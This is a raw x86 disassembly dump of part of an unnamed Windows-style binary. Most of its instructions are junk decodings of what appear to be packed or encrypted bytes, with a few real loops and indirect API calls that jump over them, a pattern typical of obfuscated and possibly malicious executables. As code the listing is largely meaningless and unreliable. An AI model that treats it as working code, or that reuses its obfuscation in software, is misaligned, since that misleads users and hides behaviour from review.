  418f63:	scas   al,BYTE PTR es:[edi]
  418f64:	mov    bl,0xd2
  418f66:	adc    BYTE PTR [eax-0x7c],bh
  418f69:	nop
  418f6a:	mov    al,BYTE PTR [edx+ebp*2+0x30]
  418f6e:	or     BYTE PTR [ecx+0x8],al
  418f71:	je     0x418f16
  418f73:	inc    edi
  418f74:	fcomp  DWORD PTR [esi]
  418f76:	or     eax,0x73962cc7
  418f7b:	pop    ss
  418f7c:	jne    0x418f33
  418f7e:	sahf   
  418f7f:	lea    edx,[ecx+0x3a]
  418f82:	sahf   
  418f83:	loope  0x418fcf
  418f85:	xor    eax,0xff793a29
  418f8a:	push   edx
  418f8b:	mov    esi,DWORD PTR [ebx+0x5d7c5416]
  418f91:	adc    edi,edx
  418f93:	mov    ebx,0xcd7c5bab
  418f98:	adc    DWORD PTR [edx-0x23],0x68
  418f9c:	lds    ebp,FWORD PTR [ebp+eiz*4+0x29d2d49b]
  418fa3:	in     eax,0xba
  418fa5:	ins    DWORD PTR es:[edi],dx
  418fa6:	pushf  
  418fa7:	je     0x418fd4
  418fa9:	sar    DWORD PTR [edi+eiz*1+0xedfbdcf],1
  418fb0:	lahf   
  418fb1:	popa   
  418fb2:	ror    eax,cl
  418fb4:	scas   eax,DWORD PTR es:[edi]
  418fb5:	cdq    
  418fb6:	xor    BYTE PTR [esi+0x289d814],al
  418fbc:	cmp    bh,BYTE PTR [edi+eax*8]
  418fbf:	mov    ah,0xcf
  418fc1:	cmp    bh,dh
  418fc3:	mov    ?,ecx
  418fc5:	push   esi
  418fc6:	pop    ss
  418fc7:	push   ebp
  418fc8:	jmp    0xc213:0x22cef75
  418fcf:	mov    dh,0xb5
  418fd1:	(bad)
  418fd4:	or     bl,dh
  418fd6:	fild   WORD PTR [edx-0x2cfbefb4]
  418fdc:	adc    ebx,esp
  418fde:	mov    edx,0x20310c4
  418fe3:	pop    esp
  418fe4:	shr    edx,1
  418fe6:	push   ebp
  418fe7:	inc    edx
  418fe8:	pop    ds
  418fe9:	mov    WORD PTR [ebp+ebp*4-0x58],ss
  418fed:	xlat   BYTE PTR ds:[ebx]
  418fee:	xchg   esi,eax
  418fef:	enter  0x6a35,0x7d
  418ff3:	push   0xd50bd10f
  418ff8:	add    al,0xf7
  418ffa:	mov    ds:0x6d8020a5,al
  418fff:	and    ah,BYTE PTR [ecx]
  419001:	mov    esp,0xcaabf2ff
  419006:	sub    eax,0xb7578887
  41900c:	popa   
  41900d:	mov    BYTE PTR [ecx+0x6c],cl
  419010:	dec    ecx
  419011:	ds in  al,dx
  419013:	sar    BYTE PTR [eax],0xf8
  419016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419017:	sub    eax,0x63f43256
  41901c:	or     DWORD PTR [eax],esi
  41901e:	jmp    0xe9fbf8c6
  419023:	xor    eax,ecx
  419025:	das    
  419026:	add    BYTE PTR [esi+eax*1-0x2],0xcd
  41902b:	push   ss
  41902c:	aas    
  41902d:	and    eax,0x93aa0962
  419032:	push   es
  419033:	xor    al,BYTE PTR ds:0x17674dd1
  419039:	push   es
  41903a:	out    dx,eax
  41903b:	ret    
  41903c:	pop    es
  41903d:	dec    edi
  41903e:	scas   eax,DWORD PTR es:[edi]
  41903f:	add    al,0x4f
  419041:	clc    
  419042:	push   es
  419043:	cmp    edi,DWORD PTR [ebp-0x19]
  419046:	push   ecx
  419047:	sub    BYTE PTR [edi-0x27],ah
  41904a:	jecxz  0x419053
  41904c:	enter  0x614a,0xa0
  419050:	imul   esp,DWORD PTR [esi+0x6e],0xffffffe9
  419054:	repnz fild QWORD PTR [esi]
  419057:	dec    BYTE PTR [ebx]
  419059:	xor    BYTE PTR [edx-0x21],0xa9
  41905d:	dec    ebp
  41905e:	mov    dl,0x2b
  419060:	mov    edx,0x620ad042
  419065:	push   0xffffffd5
  419067:	push   es
  419068:	lods   eax,DWORD PTR ds:[esi]
  419069:	leave  
  41906a:	and    eax,0xe4ee81b2
  41906f:	adc    DWORD PTR [edi+eiz*2],ebx
  419072:	fs ja  0x419007
  419075:	mov    ecx,0xdd4154b0
  41907a:	push   DWORD PTR [ecx+0xa]
  41907d:	or     BYTE PTR [edx+eax*4-0x773caa0],dl
  419084:	jo     0x4190e9
  419086:	ins    DWORD PTR es:[edi],dx
  419087:	and    BYTE PTR [eax-0x6d31c8b4],al
  41908d:	and    ch,ch
  41908f:	and    edi,DWORD PTR [edi-0x67]
  419092:	mov    ds:0xcfaed2bb,al
  419097:	xor    al,0x20
  419099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41909a:	xor    ecx,DWORD PTR [esi+eax*4-0x1a]
  41909e:	cld    
  41909f:	lea    esp,[ebx-0x6754d1d8]
  4190a5:	push   ebp
  4190a6:	sub    edi,ecx
  4190a8:	js     0x419073
  4190aa:	push   esp
  4190ab:	imul   eax,DWORD PTR [ecx-0x61],0xf633f9ad
  4190b2:	jne    0x4190f6
  4190b4:	addr16 test al,0x73
  4190b7:	xchg   esi,eax
  4190b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190b9:	jo     0x419048
  4190bb:	test   eax,0x442a5190
  4190c0:	call   0x55b6:0x9b34f551
  4190c7:	bound  eax,QWORD PTR ds:0x50629daf
  4190cd:	inc    ebp
  4190ce:	xor    BYTE PTR [ebp-0x6f3b17ec],al
  4190d4:	imul   edi,DWORD PTR [edi],0x12790362
  4190da:	add    bh,ah
  4190dc:	xchg   BYTE PTR ds:0x82d41df3,cl
  4190e2:	mov    dl,0x7
  4190e4:	jmp    0x41907f
  4190e6:	pusha  
  4190e7:	cmp    esp,edi
  4190e9:	push   edi
  4190ea:	mov    WORD PTR [edx+0x2e],es
  4190ed:	ins    BYTE PTR es:[edi],dx
  4190ee:	mov    esp,0x54992e3b
  4190f3:	sbb    al,0x12
  4190f5:	pause  
  4190f7:	in     al,0xa5
  4190f9:	ret    0xa2de
  4190fc:	mov    esi,0xa7dddf28
  419101:	ret    0x86e6
  419104:	dec    esp
  419105:	mov    ds:0x6dbb508f,eax
  41910a:	call   0xf5f9:0xd041da68
  419111:	scas   al,BYTE PTR es:[edi]
  419112:	call   0x22e5:0x33066cbd
  419119:	jecxz  0x419178
  41911b:	pop    es
  41911c:	adc    DWORD PTR [eax-0x15],ebp
  41911f:	div    BYTE PTR [eax+0x57]
  419122:	xchg   ebp,ebx
  419124:	outs   dx,DWORD PTR ds:[esi]
  419125:	xchg   esi,eax
  419126:	rol    al,1
  419128:	enter  0xab0d,0x44
  41912c:	popa   
  41912d:	push   ebx
  41912e:	or     dh,ch
  419130:	dec    ebp
  419131:	fwait
  419132:	pushf  
  419133:	rol    eax,1
  419135:	or     al,0xee
  419137:	jno    0x4191a1
  419139:	fst    DWORD PTR [ebp+eiz*8+0x19]
  41913d:	cmp    edi,edx
  41913f:	pop    esi
  419140:	push   eax
  419141:	cmc    
  419142:	out    0x37,eax
  419144:	loopne 0x419162
  419146:	fldcw  WORD PTR [eax]
  419148:	fsub   DWORD PTR [edx]
  41914a:	hlt    
  41914b:	je     0x419140
  41914d:	xchg   eax,edi
  41914f:	sbb    eax,0x6ed86d5e
  419154:	test   DWORD PTR [edi+ebp*2+0x48cceec6],edx
  41915b:	or     bl,cl
  41915d:	adc    esp,edx
  41915f:	or     DWORD PTR [ebx],ebx
  419161:	loop   0x419117
  419163:	shl    DWORD PTR [eax-0x53ccfc75],cl
  419169:	mov    es,WORD PTR gs:[eax+0x405908af]
  419170:	cmp    eax,0x80f25321
  419175:	test   al,0x93
  419177:	pop    DWORD PTR [edi+0x5e]
  41917a:	push   es
  41917b:	aam    0xb9
  41917d:	ret    0x9fac
  419180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419181:	retf   
  419182:	sti    
  419183:	xor    BYTE PTR [esp+eiz*2-0x6e9c753e],dl
  41918a:	call   eax
  41918c:	jmp    0x419194
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    ss,ecx
  4191b0:	cwde   
  4191b1:	in     al,dx
  4191b2:	repz or ch,al
  4191b5:	jg     0x41922f
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x4191ae
  4191bc:	jp     0x4191d4
  4191be:	scas   eax,DWORD PTR es:[edi]
  4191bf:	cmp    al,0xf8
  4191c1:	in     al,dx
  4191c2:	imul   edx,DWORD PTR [edi-0x770f110],0x39960a35
  4191cc:	pop    edx
  4191cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191ce:	lea    esp,[ebp-0x2268c655]
  4191d4:	pop    ss
  4191d5:	and    BYTE PTR [esp+edi*2-0x29],cl
  4191d9:	inc    edx
  4191da:	jmp    0xcf94:0xc23a9598
  4191e1:	dec    eax
  4191e2:	sahf   
  4191e3:	or     ebx,DWORD PTR [eax+edx*4+0x39]
  4191e7:	mov    ebx,0xeb19f9fb
  4191ec:	pusha  
  4191ed:	sbb    DWORD PTR [edi+esi*4-0x6d4803d2],edi
  4191f4:	rcl    DWORD PTR [edi-0xb],cl
  4191f7:	out    dx,al
  4191f8:	mov    dl,0xff
  4191fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191fb:	retf   0xfb72
  4191fe:	sbb    eax,0xf6f72698
  419203:	add    eax,0x1d8b7ff7
  419208:	jmp    0xc70b2ca3
  41920d:	dec    esi
  41920e:	xchg   edx,eax
  41920f:	fs push 0x4c
  419212:	mov    ebx,DWORD PTR [eax+0x79]
  419215:	mov    al,0x3c
  419217:	add    al,0x15
  419219:	out    dx,eax
  41921a:	call   0x27df:0x375c63dd
  419221:	mov    eax,ds:0x368cf55d
  419226:	(bad)  
  419227:	stc    
  419228:	cdq    
  419229:	lock pop esi
  41922b:	call   0xbe82:0xb439a9b1
  419232:	dec    eax
  419233:	test   DWORD PTR [ebx-0x38],esp
  419236:	call   0xd7bc:0x8f10ef3e
  41923d:	xor    al,0xcf
  41923f:	int3   
  419240:	popa   
  419241:	loopne 0x419233
  419243:	fs mov ch,0x7
  419246:	sub    BYTE PTR [esi-0x225718ed],0x6d
  41924d:	je     0x41929e
  41924f:	mov    bh,cl
  419251:	mov    bh,0x68
  419253:	xchg   esi,eax
  419254:	mov    ds:0xd3979f42,eax
  419259:	xor    al,0x50
  41925b:	mov    eax,ds:0x90e58ee7
  419260:	push   es
  419261:	xchg   edi,eax
  419262:	imul   eax,DWORD PTR [ebp-0x31c098],0xffffff86
  419269:	neg    BYTE PTR [ebp+0x0]
  41926c:	push   ds
  41926d:	adc    BYTE PTR [edx-0x10],dl
  419270:	sub    eax,0xeadd14b4
  419275:	adc    BYTE PTR [edi+0x11],bh
  419278:	fisttp WORD PTR [esi+eax*4]
  41927b:	push   ebx
  41927c:	loop   0x419261
  41927e:	or     ebp,DWORD PTR [ecx]
  419280:	cmp    eax,0xe039d198
  419285:	jb     0x4192af
  419287:	in     eax,0x9b
  419289:	jns    0x4192b1
  41928b:	xlat   BYTE PTR ds:[ebx]
  41928c:	pop    ecx
  41928d:	sbb    al,0x77
  41928f:	jns    0x419280
  419291:	add    ecx,DWORD PTR [eax+0x11f673f8]
  419297:	and    DWORD PTR [edx],esi
  419299:	mov    bh,0x99
  41929b:	pop    es
  41929c:	inc    eax
  41929d:	in     eax,dx
  41929e:	(bad)  
  41929f:	pop    esp
  4192a0:	sar    BYTE PTR [ecx+0x16d1ed9c],1
  4192a6:	sbb    al,0x6
  4192a8:	adc    al,BYTE PTR [ebp-0x3]
  4192ab:	xor    DWORD PTR [edi+edx*1-0x2b3a879e],esi
  4192b2:	cmp    edi,DWORD PTR [edi+0x4146eed0]
  4192b8:	mov    al,0xd8
  4192ba:	in     eax,0xe7
  4192bc:	jns    0x4192d5
  4192be:	dec    eax
  4192bf:	int    0x57
  4192c1:	pop    ds
  4192c2:	mov    ah,0xc9
  4192c4:	test   DWORD PTR [ebx],0x934321d4
  4192ca:	out    0x81,al
  4192cc:	cmp    ebp,DWORD PTR [edi]
  4192ce:	mov    bh,0x1e
  4192d0:	lods   eax,DWORD PTR ds:[esi]
  4192d1:	sub    al,0x76
  4192d3:	mov    DWORD PTR [edx-0x7b14dad],0xac2e872a
  4192dd:	pop    edx
  4192de:	das    
  4192df:	stos   DWORD PTR es:[edi],eax
  4192e0:	ja     0x41928f
  4192e2:	shl    BYTE PTR [esi-0x3f],0xa
  4192e6:	xchg   ebp,eax
  4192e7:	mov    bl,0xbd
  4192e9:	popa   
  4192ea:	lahf   
  4192eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192ec:	(bad)  
  4192ed:	pop    ds
  4192ee:	push   0xffffffe9
  4192f0:	sahf   
  4192f1:	mov    ch,0xc9
  4192f3:	jns    0x41929b
  4192f5:	add    dl,ah
  4192f7:	rcr    cl,1
  4192f9:	cli    
  4192fa:	mov    ds:0x675390e,eax
  4192ff:	or     dh,dh
  419301:	mov    al,0x28
  419303:	jge    0x41929d
  419305:	into   
  419306:	loope  0x419343
  419308:	and    al,0xc
  41930a:	test   DWORD PTR fs:[ecx+0x23784afc],esp
  419311:	or     cl,BYTE PTR [ebx-0x587e9251]
  419317:	je     0x4192c0
  419319:	add    DWORD PTR [edi+0x8],ecx
  41931c:	add    dl,0xbc
  41931f:	out    dx,al
  419320:	inc    ecx
  419321:	lea    edi,[ebp+0x6d]
  419324:	rcl    DWORD PTR [ebx-0x16],0xef
  419328:	daa    
  419329:	sbb    bh,BYTE PTR [ebp+0x6fbdf8aa]
  41932f:	jmp    0xb71c73b3
  419334:	adc    eax,0x60cb9235
  419339:	std    
  41933a:	pop    ebx
  41933b:	push   edi
  41933c:	dec    eax
  41933d:	push   ecx
  41933e:	xchg   ebp,eax
  41933f:	ins    DWORD PTR es:[edi],dx
  419340:	push   esi
  419341:	cs inc edx
  419343:	(bad)  
  419344:	xchg   ebp,eax
  419345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419347:	jbe    0x419350
  419349:	sub    eax,0xd614549a
  41934e:	xchg   esi,eax
  41934f:	dec    esp
  419350:	pop    ds
  419351:	mov    dh,0xa0
  419353:	sbb    al,0x23
  419355:	rcr    BYTE PTR [ebx+0x885ea4],cl
  41935b:	mov    ecx,DWORD PTR [ebx+edx*1-0x23470d97]
  419362:	jle    0x4192fb
  419364:	xchg   ebp,eax
  419365:	leave  
  419366:	sub    al,0x90
  419368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419369:	inc    ebx
  41936a:	jmp    0x4193bc
  41936c:	sub    ah,BYTE PTR [ebx]
  41936e:	push   ecx
  41936f:	mov    ebx,0x76fb3570
  419374:	ins    DWORD PTR es:[edi],dx
  419375:	push   ecx
  419376:	pop    ss
  419377:	push   es
  419378:	push   ss
  419379:	mov    ?,WORD PTR [esi+0x6a]
  41937c:	lahf   
  41937d:	jo     0x419383
  41937f:	mov    ecx,DWORD PTR [ebx]
  419381:	add    cl,BYTE PTR ds:0x80ce54d6
  419387:	jmp    0x419392
  419389:	adc    BYTE PTR [esp+eiz*2-0x55316144],al
  419390:	push   ebp
  419391:	or     al,0xb5
  419393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419394:	add    eax,0xa56abbce
  419399:	ror    BYTE PTR [esi+eiz*8-0x2d],0xa2
  41939e:	lock outs dx,DWORD PTR ds:[esi]
  4193a0:	fldenv [ebp+ebx*4+0x52]
  4193a4:	adc    cl,BYTE PTR [ecx-0x2a]
  4193a7:	mov    ebx,0x49860c78
  4193ac:	jnp    0x419341
  4193ae:	mov    ebx,0x97274d54
  4193b3:	leave  
  4193b4:	xchg   ebp,eax
  4193b5:	dec    ebx
  4193b6:	push   es
  4193b7:	or     ebp,DWORD PTR [edi+edi*1]
  4193ba:	leave  
  4193bb:	mov    dl,0xeb
  4193bd:	sahf   
  4193be:	pop    esi
  4193bf:	cmp    eax,0x751c9fef
  4193c4:	fucom  st(5)
  4193c6:	push   ebp
  4193c7:	mov    eax,0x2d88c68a
  4193cc:	push   ss
  4193cd:	std    
  4193ce:	dec    esi
  4193cf:	inc    esp
  4193d0:	fwait
  4193d1:	jl     0x419413
  4193d3:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  4193da:	and    DWORD PTR ds:0x42a87d,0x0
  4193e4:	xor    ecx,ecx
  4193e6:	add    ecx,DWORD PTR ds:0x42a87d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a87d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a87d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a87d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a801,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a801
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a801,ecx
  419434:	cmp    DWORD PTR ds:0x42a801,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a801,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a98f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7b1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a80d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a80d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a80d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a80d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa48
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a80d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a805
  4194bb:	and    DWORD PTR ds:0x42a775,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a76d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a779
  4194d8:	adc    DWORD PTR ds:0x42a871,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a761,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a87d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a7f5,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a839,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi+0x4a],eax
  41952b:	mov    BYTE PTR [ebp-0x2b],0x20
  41952f:	retf   
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x419549
  419537:	stos   DWORD PTR es:[edi],eax
  419538:	push   0x7d15491
  41953d:	xor    bh,dl
  41953f:	pop    ebx
  419540:	jb     0x4195bc
  419542:	sub    dh,BYTE PTR [edi]
  419544:	mov    ebx,0x577a1b57
  419549:	lea    esp,[esi+eax*2-0x57c42cbc]
  419550:	dec    DWORD PTR [ebp+0x76]
  419553:	inc    edi
  419554:	retf   
  419555:	test   DWORD PTR [eax+edx*1+0x88c2105],edi
  41955c:	xor    BYTE PTR [ebp-0x6a0483b2],cl
  419562:	xor    DWORD PTR [edi-0x6fed4e7],edx
  419568:	add    DWORD PTR [edx+0x4d],0x4a0d7318
  41956f:	mov    BYTE PTR [edx],bh
  419571:	xchg   esi,eax
  419572:	xchg   ebx,eax
  419573:	xchg   edx,eax
  419574:	mov    bh,0x49
  419576:	fsub   st,st(6)
  419578:	ret    0x8d51
  41957b:	sbb    DWORD PTR [eax-0x7f],edx
  41957e:	jecxz  0x419532
  419580:	inc    esi
  419581:	mov    WORD PTR ds:0x3f043b7,ds
  419587:	ret    0x4910
  41958a:	add    al,0xd6
  41958c:	cmp    eax,0xc380d603
  419591:	dec    edi
  419592:	out    dx,eax
  419593:	jmp    0x95bb7c3a
  419598:	lods   eax,DWORD PTR ds:[esi]
  419599:	div    DWORD PTR ds:0x79ffbc9c
  41959f:	push   ebx
  4195a0:	push   DWORD PTR [ecx-0x6aa7b69f]
  4195a6:	cmp    dl,ch
  4195a8:	mov    dx,0x2271
  4195ac:	xor    bl,BYTE PTR [ebp-0x1b1ad0e1]
  4195b2:	pop    ebx
  4195b3:	pop    esi
  4195b4:	dec    edi
  4195b5:	and    eax,0x79c1f1ad
  4195ba:	(bad)  
  4195bb:	stc    
  4195bc:	leave  
  4195bd:	mov    WORD PTR [ebp+0xfa8f3a8],gs
  4195c3:	imul   esp,DWORD PTR [eax-0x16],0xffffff89
  4195c7:	xchg   DWORD PTR [esi],ecx
  4195c9:	out    0x57,al
  4195cb:	ins    DWORD PTR es:[edi],dx
  4195cc:	mov    edx,0xd52b4aec
  4195d1:	add    esp,DWORD PTR [eax]
  4195d3:	cmp    edx,DWORD PTR [edi]
  4195d5:	in     al,dx
  4195d6:	mov    WORD PTR [edi+ebp*4-0x3ae86556],cs
  4195dd:	gs jmp 0xfa80ceb4
  4195e3:	repnz or BYTE PTR es:[eax+0x657e528e],dl
  4195eb:	mov    ds:0xc174d9b6,al
  4195f0:	addr16 clc 
  4195f2:	outs   dx,DWORD PTR ds:[esi]
  4195f3:	mov    esi,DWORD PTR [esi]
  4195f5:	dec    edx
  4195f6:	in     al,dx
  4195f7:	fwait
  4195f8:	mov    eax,ds:0x7e083473
  4195fd:	psubusb mm3,QWORD PTR [ebx+0x71]
  419601:	xchg   esp,eax
  419602:	je     0x419589
  419604:	adc    BYTE PTR [esi-0x7e],bl
  419607:	xchg   al,bl
  419609:	ins    BYTE PTR es:[edi],dx
  41960a:	sub    DWORD PTR [edi],0x2b50e5af
  419610:	mov    dh,0x69
  419612:	aas    
  419613:	int3   
  419614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419615:	loope  0x4195f8
  419617:	adc    eax,0xec67dd52
  41961c:	pop    ebx
  41961d:	mov    ch,BYTE PTR [edx]
  41961f:	nop
  419620:	pop    ss
  419621:	push   DWORD PTR [edx+0x5bed46cf]
  419627:	scas   al,BYTE PTR es:[edi]
  419628:	es pop esp
  41962a:	inc    esp
  41962b:	dec    esi
  41962c:	in     al,dx
  41962d:	popa   
  41962e:	pop    ds
  41962f:	dec    esp
  419630:	cs je  0x419699
  419633:	adc    eax,0x7dd22518
  419638:	aas    
  419639:	xor    eax,0x452408ab
  41963e:	adc    cl,BYTE PTR [ecx+0x66]
  419641:	mov    edx,0x41e53c85
  419646:	lds    ecx,FWORD PTR [esi]
  419648:	dec    esi
  419649:	sbb    bl,dl
  41964b:	aad    0x1e
  41964d:	mov    ebx,0xfb04ee2a
  419652:	loope  0x419616
  419654:	push   ebx
  419655:	frstor [ebx]
  419657:	jg     0x41961e
  419659:	imul   eax,DWORD PTR [ebx],0xffffffcc
  41965c:	fnstsw WORD PTR [esi]
  41965e:	cdq    
  41965f:	das    
  419660:	(bad)  [ecx-0xf]
  419663:	jb     0xfce6439b
  419669:	xchg   edi,eax
  41966a:	pushf  
  41966b:	in     eax,dx
  41966c:	out    0x3e,eax
  41966e:	call   0x63cd:0x767b3d08
  419675:	jnp    0x4196e0
  419677:	adc    BYTE PTR [ecx+0x5b],ch
  41967a:	pop    esi
  41967b:	stc    
  41967c:	pop    esp
  41967d:	inc    ebp
  41967e:	loop   0x4196e3
  419680:	inc    edi
  419681:	mov    ch,0xa5
  419683:	fwait
  419684:	jnp    0x419687
  419686:	cmp    al,0xe3
  419688:	fwait
  419689:	jg     0x419660
  41968b:	mov    cl,0xdf
  41968d:	mov    al,ds:0x2be1d550
  419692:	xchg   esi,eax
  419693:	push   ebx
  419694:	nop
  419695:	retf   
  419696:	sbb    DWORD PTR [eax],esi
  419698:	add    eax,0x948bc238
  41969d:	dec    edx
  41969e:	push   ecx
  41969f:	mov    ds:0xee9d6582,eax
  4196a4:	add    eax,0xa7652aea
  4196a9:	jmp    0x907e:0xd5efdd7b
  4196b0:	fdiv   st,st(0)
  4196b2:	ins    BYTE PTR es:[edi],dx
  4196b3:	dec    ebx
  4196b4:	retf   
  4196b5:	test   BYTE PTR [edi],0x93
  4196b8:	outs   dx,DWORD PTR ds:[esi]
  4196b9:	cs in  al,0xdb
  4196bc:	or     al,0x8a
  4196be:	stc    
  4196bf:	sub    bl,al
  4196c1:	xchg   edi,eax
  4196c2:	in     al,0xd8
  4196c4:	mov    esi,0x67a916de
  4196c9:	aas    
  4196ca:	pop    ss
  4196cb:	push   edx
  4196cc:	xor    cl,BYTE PTR [edx]
  4196ce:	push   ss
  4196cf:	cmp    esi,esi
  4196d1:	xchg   edx,eax
  4196d2:	dec    esp
  4196d3:	inc    esp
  4196d4:	scas   al,BYTE PTR es:[edi]
  4196d5:	out    dx,eax
  4196d6:	xchg   edi,eax
  4196d7:	daa    
  4196d8:	jle    0x419728
  4196da:	jge    0x419751
  4196dc:	jnp    0x41971a
  4196de:	fiadd  DWORD PTR [edx+0x51ac8312]
  4196e4:	fwait
  4196e5:	int3   
  4196e6:	xchg   DWORD PTR [ebx+0x405a3f0d],esi
  4196ec:	mov    al,0x8e
  4196ee:	ins    DWORD PTR es:[edi],dx
  4196ef:	je     0x4196ab
  4196f1:	in     eax,0x78
  4196f3:	dec    esi
  4196f4:	rcl    dl,1
  4196f6:	aad    0x1f
  4196f8:	pushf  
  4196f9:	xchg   edx,eax
  4196fa:	shr    BYTE PTR [eax+ecx*1+0x42b1b553],0x6d
  419702:	shl    bh,0xa7
  419705:	fist   DWORD PTR gs:[esi+0x23]
  419709:	sub    ebx,DWORD PTR [ebx]
  41970b:	mov    esp,0x861cb0c1
  419710:	call   0xdd3b:0x1e74e6a3
  419717:	sti    
  419718:	xor    eax,0x7a8370c6
  41971d:	inc    eax
  41971e:	cmp    dl,BYTE PTR [edi]
  419720:	ret    0xadb2
  419723:	pop    ss
  419724:	pusha  
  419725:	cdq    
  419726:	mov    ch,0x1e
  419728:	shl    BYTE PTR [ebx],cl
  41972a:	xor    bl,al
  41972c:	pop    edi
  41972d:	and    eax,0x357d845b
  419732:	aad    0xb
  419734:	inc    esp
  419735:	add    al,0x49
  419737:	addr16 add eax,0xe527009a
  41973d:	in     eax,dx
  41973e:	in     al,dx
  41973f:	and    esi,DWORD PTR [ecx+0x54]
  419742:	mov    dh,0x3e
  419744:	xor    DWORD PTR [edi+0x7ede15f2],0x60
  41974b:	push   ebx
  41974c:	es adc eax,0x3144d8b
  419752:	test   BYTE PTR [ebx-0x1bb276f7],0xf
  419759:	scas   eax,DWORD PTR es:[edi]
  41975a:	shl    BYTE PTR [ebx],1
  41975c:	cmp    eax,0x42a801
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a87d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a845
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7b5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0x4fe5ddeb
  41979d:	add    al,BYTE PTR [eax+edi*1]
  4197a0:	leave  
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x41974e
  4197a8:	dec    ecx
  4197a9:	inc    ebx
  4197aa:	fstp   DWORD PTR [esi+0x7e87f8d7]
  4197b0:	cmp    dh,BYTE PTR [ebp-0x35da5d90]
  4197b6:	lods   eax,DWORD PTR ds:[esi]
  4197b7:	push   ebx
  4197b8:	inc    ebx
  4197b9:	xchg   esp,eax
  4197ba:	mov    ecx,0x80d4b2
  4197bf:	and    eax,DWORD PTR [esp+eax*2-0x3f5a2b86]
  4197c6:	cmp    DWORD PTR [edx-0xb7819bd],esi
  4197cc:	push   edx
  4197cd:	mov    ch,0xfc
  4197cf:	sar    BYTE PTR [ebx],1
  4197d1:	mov    ?,ebx
  4197d3:	scas   eax,DWORD PTR es:[edi]
  4197d4:	fwait
  4197d5:	jp     0x4197d5
  4197d7:	jl     0x419822
  4197d9:	mov    gs,edx
  4197db:	out    dx,al
  4197dc:	add    BYTE PTR [ebx-0x5b],ch
  4197df:	inc    esp
  4197e0:	push   ecx
  4197e1:	dec    ecx
  4197e2:	add    DWORD PTR ds:0xcb0873db,0xfffffff9
  4197e9:	das    
  4197ea:	aas    
  4197eb:	dec    edx
  4197ec:	sub    eax,0xfb9c0262
  4197f1:	xchg   ebp,eax
  4197f2:	mov    gs,WORD PTR [eax-0x29]
